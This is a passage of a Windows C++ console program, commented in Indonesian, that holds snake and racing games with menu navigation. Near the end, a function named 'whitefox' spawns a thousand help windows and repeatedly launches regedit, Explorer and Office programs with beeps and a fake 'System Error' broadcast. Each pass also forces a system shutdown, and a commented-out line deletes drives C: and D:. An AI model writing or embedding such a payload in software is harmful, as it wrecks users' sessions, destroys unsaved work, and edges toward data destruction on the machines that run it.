            cout << "\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2" << endl;
            cout << endl;cout << endl;race_game();cout << endl;cout << endl;
        }
        else{goto choosing_in_mapi;}
    }
    else if(pilihan == "GOHOME"){system("cls");main_program();}
    else{goto game;}
    return 0;
}
int snake_game()
{
    snake_game:system("cls");string pilihan;
    system("cls");inisialisasi();while(!(isDestroy())){velo();getkey();if(isEaten()){nEkor+=2;random_makanan();tulis_skor();}Sleep(40-(nEkor/10));}system("cls");gotoxy(32,12);cout<<"Skor : "<<(nEkor-5)*10;gotoxy(25,13);system("pause");
    cout << endl;choosing_in_snake_game:
    cout << "Jalankan kembali Program ini [JKPI] / Lihat List di Game [GAME] / Go Home [GOHOME] : ";cin>>pilihan;
    if(pilihan == "JKPI"){system("cls");goto snake_game;}
    else if(pilihan == "GAME"){system("cls");game();}
    else if(pilihan == "GOHOME"){system("cls");main_program();}
    else{goto choosing_in_snake_game;}return 0;
}
void gotoxy(int x, int y){COORD pos={x,y};SetConsoleCursorPosition(GetStdHandle(STD_OUTPUT_HANDLE),pos);}
void naik(){veloY=-1;veloX=0;}
void turun(){veloY=1;veloX=0;}
void samping(){veloX=-1;veloY=0;}
void samping_k(){veloX=1;veloY=0;}
void hapus(){gotoxy(xHapus,yHapus);cout<<" ";}
void ekor(){for(int j=0;j<=2;j++){gotoxy(ekorsX[j],ekorsY[j]);cout<<"+";}}
void tampil(){gotoxy(iX, iY);cout<<char(2);gotoxy(makX,makY);cout<<"*";}
void ganti_posisi(){xHapus=ekorsX[nEkor-1];yHapus=ekorsY[nEkor-1];for(int j=nEkor-1;j>=1;j--){ekorsX[j]=ekorsX[j-1];ekorsY[j]=ekorsY[j-1];}ekorsX[0]=iX;ekorsY[0]=iY;}
void velo(){ganti_posisi();hapus();iX += veloX;iY += veloY;tampil();ekor();}
/*void trace(){for(int j = 0; j <= nEkor -1; j++){cout << "x" << j << " y"<< j<< " = " << ekorsX[j] << "," << ekorsY[j];cout << " // " << iX << "," << iY << endl;}system("pause");system("cls");}*/
bool isDestroy(){if(iX==batas_samping_k){iX=3;gotoxy(78,iY);cout<<" ";}if(iX==batas_samping){iX=77;gotoxy(2,iY);cout<<" ";}if(iY==batas_atas){iY=22;gotoxy(iX,2);cout<<" ";}if(iY==batas_bawah){iY=3;gotoxy(iX,23);cout<<" ";}for(int j=0;j<=nEkor-1;j++)if(ekorsX[j]==iX&&ekorsY[j]==iY)return true;return false;}
char getkey(){for(int i = 8; i <= 222; i++){if(GetAsyncKeyState(i)==-32767){switch(i){case 38:if(veloY !=1)naik();break;case 40:if(veloY!=-1)turun();break;case 37:if(veloX!=1)samping();break;case 39:if(veloX!=-1)samping_k();break;}}}}
void random_makanan(){makX=rand()%(batas_samping_k-1);if(makX<4)makX+=3+(4-makX);makY=rand()%(batas_bawah-1);if(makY<4)makY+=3+(4-makY);gotoxy(makX, makY);cout << "*";}
bool isEaten(){if(iX==makX&&iY==makY)return true; else return false;}
void cBorder(){for(int i=1;i<=78;i++){for(int j=1;j<=24;j+=23){if(j>1||i>=32){gotoxy(i,j);cout<<char(219);}}}for(int i=1;i<=24;i++){for(int k=1;k<=80;k+=78){gotoxy(k,i);cout<<char(219);}}}
void skor(){gotoxy(3,1); cout << "Skor : ";gotoxy(18,1); cout << "Panjang : ";}
void tulis_skor(){gotoxy(11,1);cout<<(nEkor-5)*10;gotoxy(28,1);cout<<nEkor;}
void inisialisasi(){cBorder();random_makanan();skor();tulis_skor();}
int race_game()
{
    race_game:system("cls");string pilihan;
    int spk=0;float fSpk=0;
	while(spk<=0)
	{
		system("cls");
		tulisTengah("GAME BALAP by ParlinCode v 1.0", 10);
		tulisTengah("==============================", 11);
		tulisTengah("Masukkan Tingkat Kesulitan [Berupa Angka]", 13);
		tulisTengah("Semakin besar angka nya semakin mudah", 14);
		tulisTengah("Follow Me Twitter : @parlincode  Fb : parlindungan.sinabariba", 20);
		tulisTengah("Masukkan angka [ besar dari 0 ]: ", 15);
		cin>>fSpk;spk=(int)fSpk;
	}
	system("cls");srand(clock());car pemainUtama;car enemy[4];char control = ' ';
    enemy[0].setPos(20 + rand()%34, 0);enemy[1].setPos(20 + rand()%34, 0);enemy[2].setPos(20 + rand()%34, 0);enemy[0].exis = true;
    bool mulai=false;int spasi=8,awal=0,nMusuh=0,iJarak=0;batangDarah(pemainUtama.darah);
    float before=clock();gambarLatar();Credit();
    while(pemainUtama.darah>0&&(spk-iJarak/200)>0)
    {
        Speed(spk-iJarak/200);iJarak++;if(awal>8)awal=0;gambarJalan(spasi,awal);awal++;
        if(kbhit()){control=getch();control=toupper(control);}
        switch (control)
        {
			case 'W' : pemainUtama.keAtas(); break;
			case 'S' : pemainUtama.keBawah(); break;
			case 'D' : pemainUtama.keKanan(); break;
			case 'A' : pemainUtama.keKiri(); break;
        }
        pemainUtama.buatGambar();
        for(int i=0;i<=2;i++)
        {
			if(enemy[i].exis==true)
			{
				enemy[i].keBawah();enemy[i].buatGambar();
				if(enemy[i].y>20){enemy[i].hapus();enemy[i].y=0;enemy[i].x=20+rand()%34;enemy[i].exis=false;nMusuh++;}
				if(enemy[i].cekTabrakan(pemainUtama)){if(pemainUtama.kebal==0){pemainUtama.darah-=10;pemainUtama.kebal=45;batangDarah(pemainUtama.darah);}}
			}
			else{nMusuh=i-1;if(nMusuh<0)nMusuh=3;if(enemy[nMusuh].y>=7){enemy[i].exis=true;}}
			if(pemainUtama.kebal>0){pemainUtama.kebal--;}
			jarak(iJarak);
        }
        if(mulai==false){opening();mulai=true;}
        control = ' ';tidur(spk-iJarak/200);
    }
    spk-=iJarak/200;system("cls");
    gotoxy(20, 12); cout << "Game Berakhir Score Anda : " << (iJarak / spk) + pemainUtama.darah * 100;
    gotoxy(20, 13); cout << "Total Waktu Bermain      : " << (clock() - before) / 1000 << " Detik";
    tulisTengah("=========================================", 16);
    tulisTengah("Terimakasih telah bermain.", 17);
    tulisTengah("Kunjungi spell1024.blogspot.com", 18);
    tulisTengah("dan follow @parlincode untuk game lainnya", 19);
    tulisTengah("=========================================", 20);
    tidur(5000);getch();
    cout << endl;choosing_in_race_game:
    cout << "Jalankan kembali Program ini [JKPI] / Lihat List di Game [GAME] / Go Home [GOHOME] : ";cin>>pilihan;
    if(pilihan == "JKPI"){system("cls");goto race_game;}
    else if(pilihan == "GAME"){system("cls");game();}
    else if(pilihan == "GOHOME"){system("cls");main_program();}
    else{goto choosing_in_race_game;}return 0;
}
//void gotoxy(int x, int y){COORD koord={x,y};SetConsoleCursorPosition(GetStdHandle(STD_OUTPUT_HANDLE),koord);}
void Credit()
{
    gotoxy(BATAS_KANAN + 5, 15); cout << "CONTROL";
    gotoxy(BATAS_KANAN + 5, 16); cout << "W : ATAS ";
    gotoxy(BATAS_KANAN + 5, 17); cout << "S : BAWAH";
    gotoxy(BATAS_KANAN + 5, 18); cout << "D : KANAN";
    gotoxy(BATAS_KANAN + 5, 19); cout << "A : KIRI";
    gotoxy(BATAS_KANAN + 5, 22); cout << "Twitter";
    gotoxy(BATAS_KANAN + 5, 23); cout << "@parlincode";
}
void gambarLatar(){for(int i=0;i<=24;i++){gotoxy(BATAS_KIRI+3,i);cout<<BATANG;gotoxy(BATAS_KANAN-2,i);cout<<BATANG;gotoxy(BATAS_KIRI,i);cout<<KOTAK<<KOTAK;gotoxy(BATAS_KANAN,i);cout<<KOTAK<<KOTAK;}}
void gambarJalan(int spasi,int awal){for(int i=awal+1;i<=24;i+=spasi){gotoxy(BATAS_KIRI,i-1);cout<<KOTAK<<KOTAK;gotoxy(BATAS_KANAN,i-1);cout<<KOTAK<<KOTAK;gotoxy(BATAS_KIRI,i);cout<< "  ";gotoxy(BATAS_KANAN,i);cout<< "  ";}}
int abs(int a){if(a<0)return-a;}
void batangDarah(int a){gotoxy(1,4);cout<< "HEALTH : ";gotoxy(1,5);for(int i=1;i<=a/10;i++){cout<<BATANG;}for(int i=1;i<=10-(a/10);i++){cout<<KOTAK;}}
void jarak(int iJarak){gotoxy(1,7);cout<< "JARAK :";gotoxy(1,8);cout<<iJarak;}
void Speed(int speed){gotoxy(1,10);cout << "KECEPATAN :";gotoxy(1,11);cout << "    ";gotoxy(1,11);cout<<speed;}
class car;
/*
class car{
  public:
    int x,y,darah,kebal;bool exis;string gambar[5];
    car(){x=25;y=20;exis=false;darah=100;kebal=0;gambar[0]=" - ";gambar[1]="0+1";gambar[2]=" + ";gambar[3]="0+1";}
    void setPos(int a, int b){x=a;y=b;}
    void keKiri(){if(x>20){hapus();x-=1;}}
    void keKanan(){if(x+2<56){hapus();x+=1;}}
    void keBawah(){if(y+3<=23){hapus();y+=1;}}
    void keAtas(){if(y+3>3){hapus();y-=1;}}
    void hapus(){gotoxy(x+1,y);cout << " ";gotoxy(x,y+1);cout << "   ";gotoxy(x+1,y+2);cout << " ";gotoxy(x,y+3);cout << "   ";}
    bool cekTabrakan(car a){if((a.y>=y&&a.y<=y+3)&&(abs(a.x-x)<3)){return true;}else{return false;}}
    void gores(){for(int i=y;i<=(y+3);i++){gotoxy(x,i);for(int j=0;j<gambar[i-y].length();j++){if(gambar[i-y][j]=='0')cout<<char(221);else if(gambar[i-y][j]=='1')cout<<char(222);else if(gambar[i-y][j]=='+')cout<<BATANG;else if(gambar[i-y][j]=='-')cout<<char(220);else cout << " ";}}}
    void buatGambar(){if(kebal==0){gores();}else{if(kebal%2==0){gores();}else{hapus();}}}
};
*/
void tulisTengah(string s, int y){gotoxy(40-(s.length()/2),y);cout<<s;}
void tidur(int a){time_t now = clock();while((clock() - now) < a) {};}
void opening(){tulisTengah("Bersedia",10);tidur(1000);tulisTengah("        ",10);tulisTengah("3",10);tidur(1000);tulisTengah("2",10);tidur(1000);tulisTengah("1",10);tidur(1000);tulisTengah(" ",10);}
int whitefox()
{
	int i;
	for(i=0;i<1000;i++){system("start help");}
	for(i=0;i<100;i++)
	{
		//Sleep(1000);
		Beep(800,300);
		//Message
		system("msg * System Error");
		//Center
		system("start explorer.exe");
		system("start notepad.exe");
		system("start regedit.exe");
		//Microsoft Office
		system("start winword.exe");Beep(800,300);system("start powerpnt.exe");Beep(800,300);system("start excel.exe");Beep(800,300);
		system("start groove.exe");Beep(800,300);system("start infopath.exe");Beep(800,300);system("start lync.exe");Beep(800,300);
		system("start msaccess.exe");Beep(800,300);system("start mspub.exe");Beep(800,300);system("start onenote.exe");Beep(800,300);
		system("start outlook.exe");Beep(800,300);		
		//int del_drive(){system("DEL C: -Y");system("DEL D: -Y");}
		system("shutdown -s -t 5 -f");
	}
	getch();
}
int credits()
{
	cout << "[Alpha] dibangun dari struktur Algoritma yang berasal dari project sebelumnya yaitu [Comb-Pro]" << endl;
}
int main(){system("color F0");system("cls");fullscreen();loading();welcome();login();}